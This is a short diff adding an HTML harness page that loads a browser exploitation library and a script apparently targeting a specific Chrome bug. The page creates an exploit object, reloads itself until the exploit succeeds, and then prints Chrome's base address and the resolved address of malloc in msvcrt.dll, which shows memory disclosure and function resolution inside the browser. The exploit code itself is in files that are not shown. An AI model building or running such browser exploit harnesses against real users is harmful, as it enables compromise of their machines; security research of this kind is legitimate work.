@@ -1,0 +1,25 @@
+<!doctype html>
+<html>
+    <body>
+        <pre id="content"></pre>
+
+        <script src="../dist/pwn.js"></script>
+        <script src="chrome-789393.js"></script>
+        <script>
+            function log(s) { document.getElementById('content').innerHTML += s + '<br>'; }
+
+            try {
+                var exploit = new Exploit();
+            } catch(e) {
+                log('Exploit failed: ' + e + '. Refreshing.');
+                document.location.href = document.location.href;
+            }
+
+            with (exploit) {
+                log('Chrome: ' + chromeBase.toString(16));
+
+                log('malloc: ' + importFunction('msvcrt.dll', 'malloc'));
+            }
+        </script>
+    </body>
+</html>
